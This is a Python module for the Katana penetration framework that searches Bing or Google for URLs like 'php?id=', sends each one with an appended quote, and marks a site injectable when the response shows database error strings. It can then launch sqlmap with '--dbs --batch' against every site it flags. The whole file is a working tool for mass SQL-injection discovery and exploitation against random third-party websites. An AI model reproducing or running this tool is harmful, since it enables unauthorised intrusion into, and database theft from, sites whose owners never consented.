# This module requires katana framework 
# https://github.com/PowerScript/KatanaFramework
#
# For adding module: sudo python2 ktf.ktf path/to/file/without/file/extention
#

# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core import				  #
from core.KATANAFRAMEWORK import *	#
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

# LIBRARIES
import commands					# Core library  
import sys						# Quit the shiat
import os						# Working with files and starting sqlmap
import re						# Searching web results for vuln
import requests					# Calling websites
#import urllib.parse			# Parsing url encoding for search
import urllib					# instead of urllib.parse for python2
#import shutil					# Checking if SQLmap is installed
from distutils.spawn import find_executable	# instead of shutil for python2
import subprocess				# Used for running SQLmap
import shlex					# Used for splitting arguments
import psutil					# Checking possible VPN connection
#import http.client				# Ping to check network connection
import httplib					# instead of http.client for python2
from time import sleep			# Multiple use cases, e.g. sleep between requests
from bs4 import BeautifulSoup	# Working with website date			   
# END LIBRARIES 

# INFORMATION MODULE
def init():
	init.Author				="TTJ - ThomasTJ 2016"
	init.Version			="1.0"
	init.Description		="Google Dork website there are prone to SQL injections."
	init.CodeName			="mcs/gd.sql"
	init.DateCreation		="30/10/2016"	  
	init.LastModification   ="30/10/2016"
	init.References			=None
	init.License			=KTF_LINCENSE
	init.var				={}

	# DEFAULT OPTIONS MODULE
	init.options = {
		# NAME				VALUE	 		RQ	  DESCRIPTION
		'basesearch'		:["php?id="		,True ,'Search string'],
		'provider'			:["b"			,True ,'(b)ing/(g)oogle'],
		'maxperpage'		:["25"			,True ,'Results per page'],
		'maxpages'			:["10"			,True ,'Pages to check'],
		'startpage'			:["1"			,True ,'Startpage'],
		'timeout'			:["5"			,True ,'Break between requests'],
		'savesearch'		:["results"		,True ,'Save urls {filename}'],
		'verbose'			:["0"			,False,'Verboselevel: 0,1,2,3'],
		'sqlmap'			:["n"			,False,'sqlmap on results y/n'],
	}
	init.aux = """
 (basesearch) examples
 -> php?id=
 -> php?cat=
 -> php?book=
 -> php?product=
 -> php?productid=
	"""
	return init
# END INFORMATION MODULE

# CODE MODULE	############################################################################################
def main(run):
	print("  #======================================#")
	print("  #										")
	print("  # Find urls which might is vuln for 	")
	print("  #		  SQL injections				")
	print("  #										")
	print("  #======================================#")
	
	#=================================
	# Make variables ready to use
	#=================================
	count = str(init.var['maxperpage'])
	startpage = int(init.var['startpage'])
	pages = (int(init.var['maxpages']) + int(init.var['startpage']))
	sleeptime = int(init.var['timeout'])
	string = str(init.var['basesearch'])
	#stringurl = urllib.parse.quote_plus(string)	# python3
	stringurl = urllib.quote_plus(string)			# python2
	if init.var['verbose'] == "":
		verboseactive = "0"
	else:
		verboseactive = init.var['verbose']
	if init.var['savesearch'] == "":
		filename = "tmp/results"
	else:
		filename = "tmp/" + init.var['savesearch']
	
	rawdata = "tmp/rawurl"
	
	print("  [*]  Searching")
	print("  [+]  Results")
	
	
	#=================================
	# Loop through pages - find possible prone urls
	#=================================
	for start in range(startpage,pages):
		
		#=========================
		# Bing search
		#=========================
		if init.var['provider'] == "b":
			counturls = 0
			pagenr = int(start)*int(count)+1
			address = "http://www.bing.com/search?q=instreamset:(url title):" + stringurl + "&count=" + count + "&first=" + str(pagenr)
			print("  [*]  Page number: " + str(int(start)+1))
			r = requests.get(address)
			soup = BeautifulSoup(r.text, 'lxml')
			for d in soup.find_all('h2'):
				for a in d.find_all('a', href=True):
					if string in a['href']:
						if verboseactive == "1":
							print("  [+]  " + a['href'])
						with open(rawdata, 'a') as file:
							file.write(a['href'] + "\n")
							counturls = counturls + 1
					elif "0.r.msn." in a['href']:
						pass
					else:
						pass
			print("  [+]  Urls captured: " + str(counturls))
			print("  [*]  Sleeping for " + str(sleeptime) + " seconds")
			sleep(sleeptime)   

		#=========================
		# Google search
		#=========================
		elif init.var['provider'] == "g":
			counturls = 0
			pagenr = int(start)*int(count)
			address = "https://www.google.dk/search?q=" + stringurl + "&num=" + count + "&start=" + str(pagenr)
			#address = "https://www.google.dk/search?q=inurl%3A" + stringurl + "&num=" + count + "&start=" + str(pagenr)
			print("  [*]  Page number: " + str(int(start)+1))
			r = requests.get(address)
			soup = BeautifulSoup(r.text, 'lxml')
			for d in soup.find_all('cite'):
				url = d.text
				if string in url:
					if verboseactive == "1":
						print("  [+]  " + url)
					with open(rawdata, 'a') as file:
						file.write(url + "\n")
						counturls = counturls + 1
			print("  [+]  Urls captured: " + str(counturls))
			print("  [*]  Sleeping for " + str(sleeptime) + " seconds")
			sleep(sleeptime)
			
		try:
			pass
	
		#=============================
		# Error, end, exit
		#=============================
		except KeyboardInterrupt:
			print("  User input - Ctrl + c")
			quitnow = input ("	Exit program (y/N): ")
			if quitnow == "y":
				print("  // Exiting\n\n")
				sys.exit()
			else:
				print("  // Continuing\n\n")
		except:
			print("  ERROR!!! ")
	
	
	#=================================
	# Done - sum it up
	#=================================
	printAlert(0," Done scraping")
	#if savesearch == "y":
	with open(rawdata) as f:
		resultsnumber = sum(1 for _ in f)
	printAlert(0," Total saved urls:  " + str(resultsnumber))
	printAlert(0," Getting ready for checking urls")
	sleep(1)
	
	print("  #==================================#")
	print("  #									")
	print("  #   Check if urls is vuln for		")
	print("  #		 SQL injection				")
	print("  #									")
	print("  #==================================#")
	
	#=================================
	# Base input
	#=================================
	
	
	print("\n  [*]  Reading raw url file")
	print("  [*]  Connecting")
	print("  [*]  Checking URL's")
	
	#=================================
	# Loop through urls and add a qoute
	#=================================
	
	with open(rawdata) as fileorg:
		
		for line in fileorg:
			checkMY1 = 0
			checkMY2 = 0
			checkMY3 = 0
			checkMY4 = 0
			checkMS1 = 0
			checkMS2 = 0
			checkMS3 = 0
			checkOR1 = 0
			checkOR2 = 0
			checkOR3 = 0
			checkPO1 = 0
			checkPO2 = 0
			try:
				# Get data
				line = line.rstrip('\n')
				url = line + "'"
				if verboseactive == "1":
					print("  [*]  " + line.strip('\n'))
				r = requests.get(url, verify=False, timeout=4)
				soup = BeautifulSoup(r.text, 'lxml')

				# Check if vuln
				# MySQL
				checkMY1 = len(soup.find_all(text=re.compile('check the manual that corresponds to your MySQL')))
				checkMY2 = len(soup.find_all(text=re.compile('SQL syntax')))
				checkMY3 = len(soup.find_all(text=re.compile('server version for the right syntax')))
				checkMY4 = len(soup.find_all(text=re.compile('expects parameter 1 to be')))
				# Microsoft SQL server
				checkMS1 = len(soup.find_all(text=re.compile('Unclosed quotation mark before the character string')))
				checkMS2 = len(soup.find_all(text=re.compile('An unhanded exception occurred during the execution')))
				checkMS3 = len(soup.find_all(text=re.compile('Please review the stack trace for more information')))
				# Oracle Errors
				checkOR1 = len(soup.find_all(text=re.compile('java.sql.SQLException: ORA-00933')))
				checkOR2 = len(soup.find_all(text=re.compile('SQLExceptionjava.sql.SQLException')))
				checkOR3 = len(soup.find_all(text=re.compile('quoted string not properly terminated')))
				# Postgre SQL
				checkPO1 = len(soup.find_all(text=re.compile('Query failed:')))
				checkPO2= len(soup.find_all(text=re.compile('unterminated quoted string at or near')))
				
				# Verbose level 2
				if verboseactive == "2":
					print("  [V]  Check1 MySQL found:	" + str(checkMY1))
					print("  [V]  Check2 MySQL found:	" + str(checkMY2))
					print("  [V]  Check3 MySQL found:	" + str(checkMY3))
					print("  [V]  Check4 MySQL found:	" + str(checkMY4))
					print("  [V]  Check5 MS SQL found:   " + str(checkMS1))
					print("  [V]  Check6 MS SQL found:   " + str(checkMS2))
					print("  [V]  Check7 MS SQL found:   " + str(checkMS3))
					print("  [V]  Check8 Oracle found:   " + str(checkOR1))
					print("  [V]  Check9 Oracle found:   " + str(checkOR2))
					print("  [V]  Check10 Oracle found:  " + str(checkOR3))
					print("  [V]  Check11 Postgre found: " + str(checkPO1))
					print("  [V]  Check12 Postgre found: " + str(checkPO2))
					
				# Verbose level 3
				if verboseactive == "3":
					checkverMY1 = soup.find(text=re.compile('check the manual that corresponds to your MySQL'))
					checkverMY2 = soup.find(text=re.compile(r'SQL syntax'))
					checkverMY3 = soup.find(text=re.compile(r'server version for the right syntax'))
					checkverMY4 = soup.find(text=re.compile('expects parameter 1 to be'))
					print("  [V]  Check1 MySQL found:	" + str(checkverMY1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
					print("  [V]  Check2 MySQL found:	" + str(checkverMY2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
					print("  [V]  Check3 MySQL found:	" + str(checkverMY3).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
					print("  [V]  Check4 MySQL found:	" + str(checkverMY4).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
					
					checkverMS1 = soup.find(text=re.compile('Unclosed quotation mark before the character string'))
					checkverMS2 = soup.find(text=re.compile('An unhanded exception occurred during the execution'))
					checkverMS3 = soup.find(text=re.compile('Please review the stack trace for more information'))
					print("  [V]  Check5 MS SQL found:   " + str(checkverMS1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
					print("  [V]  Check6 MS SQL found:   " + str(checkverMS2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
					print("  [V]  Check7 MS SQL found:   " + str(checkverMS3).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
					
					checkverOR1 = soup.find(text=re.compile('java.sql.SQLException: ORA-00933'))
					checkverOR2 = soup.find(text=re.compile('SQLExceptionjava.sql.SQLException'))
					checkverOR3 = soup.find(text=re.compile('quoted string not properly terminated'))
					print("  [V]  Check8 Oracle found:   " + str(checkverOR1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
					print("  [V]  Check9 Oracle found:   " + str(checkverOR2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
					print("  [V]  Check10 Oracle found:  " + str(checkverOR3).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))

					checkverPO1 = soup.find(text=re.compile('Query failed:'))
					checkverPO2 = soup.find(text=re.compile('unterminated quoted string at or near'))
					print("  [V]  Check11 Postgre found: " + str(checkverPO1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
					print("  [V]  Check12 Postgre found: " + str(checkverPO2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
				
				# If X is vuln
				if (checkMY1 > 0 or checkMY2 > 0 or checkMY3 > 0 or checkMY4 > 0 or checkMS1 > 0 or checkMS2 > 0 or checkMS3 > 0 or checkOR1 > 0 or checkOR2 > 0 or checkOR3 > 0 or checkPO1 > 0 or checkPO2):
					if verboseactive == "1":
						print("  [+]  " + line)
					with open(filename, 'a') as file:
						file.write(line+"\n")
				else:
					if verboseactive == "1":
						print("  [-]  " + line)
			
			# Skip X or/and exit
			except KeyboardInterrupt:
				print("  [X]  " + line)
				quitnow = input ("  Exit program (y/N): ")
				if quitnow == "y":
					print("  // Exiting\n\n")
					sys.exit()
				else:
					print("  // Continuing\n\n")
					
			# Bad X
			except:
				if verboseactive == "1":
					print("  [X]  Timeout or error in URL")
			
			   
			   
	#=================================
	# Done - sum it up
	#=================================
	printAlert(0," Done scanning urls")
	commands.getoutput('rm '+rawdata+' > null')
	with open(filename) as f:
		resultsnumber = sum(1 for _ in f)
	printAlert(0," Scraping saved in file: " + filename)
	printAlert(0," Total saved urls:  " + str(resultsnumber))
	if resultsnumber == 0:
		print("  No vuln urls, exiting\n\n")
		sys.exit()
		
	
	if init.var['sqlmap'] == "y":
		print("  #===============================#")
		print("  #							   ")
		print("  #  Scan urls with		 ")
		print("  #		SQLmap			 ")
		print("  #							   ")
		print("  #===============================#")
		
		#=================================
		# Check if sqlmap installed, file, etc.
		#=================================
	
		#if shutil.which('sqlmap') is None: # python3
		if find_executable('sqlmap') is None:
			print("  SQLmap is not installed on system - can't go on.")
			print("  Install sqlmap and run command below (sudo pacman -S sqlmap, sudo apt-get install sqlmap, etc.)")
			print("  \nCommand:")
			print("  sqlmap -m \"" + filename + "\n")
			sys.exit()
	
		printAlert(0," SQLmap will be started with arguments dbs, batch, random-agent, 4xthreads.")

		fileDestination = (os.getcwd() + "/" + filename)
		command = ('sqlmap -m ' + fileDestination + " --dbs --batch --random-agent --threads 4")
		printAlert(0," Command to execute: " + command)
		printAlert(0," Press Ctrl + c to exit")
		printAlert(0," Starting sqlmap in 5 sec: " + command)
		print("  [*]  5..")
		sleep(1)
		print("  [*]  4..")
		sleep(1)
		print("  [*]  3..")
		sleep(1)
		print("  [*]  2..")
		sleep(1)
		print("  [*]  1..")
		sleep(1)
		
		print("  [*]  Starting SQLmap - follow onscreen instructions")
		
		# RUN SQLMAP !!
		#commands.getoutput(command)
		os.system(command)
		
	else:
		printAlert(0," Exiting")
		sys.exit()
	
	
# END CODE MODULE ############################################################################################
